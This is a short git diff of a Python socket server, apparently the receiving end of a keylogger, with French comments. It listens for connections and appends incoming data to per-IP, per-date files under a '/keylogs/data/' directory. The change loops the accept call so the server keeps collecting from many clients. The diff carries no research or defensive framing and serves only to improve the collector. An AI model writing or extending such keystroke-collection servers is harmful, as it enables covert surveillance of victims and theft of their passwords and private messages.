@@ -28,15 +28,16 @@ server_socket.listen(5)
 def receiver():
     print(f"Ecoute sur {SRV}:{PORT}")
 
-    client_socket, client_address = server_socket.accept()
-    print(f"connexion de {client_address}")
+    while True:
+        client_socket, client_address = server_socket.accept()
+        print(f"connexion de {client_address}")
 
-    ficname = f"{client_address[0]}_{datetime.date.today()}.txt"
-    # recu data
-    with open("/keylogs/data/"+ficname, "a") as f:
-        data = client_socket.recv(1024)
-        f.write(data.decode('utf-8'))
-        print("Data update vers -> :" + ficname)
+        ficname = f"{client_address[0]}-{datetime.date.today()}.txt"
+        # recu data
+        with open("/keylogs/data/"+ficname, "a") as f:
+            data = client_socket.recv(1024)
+            f.write(data.decode('utf-8'))
+            print("Data update vers -> :" + ficname)
 
     client_socket.close()
     server_socket.close()
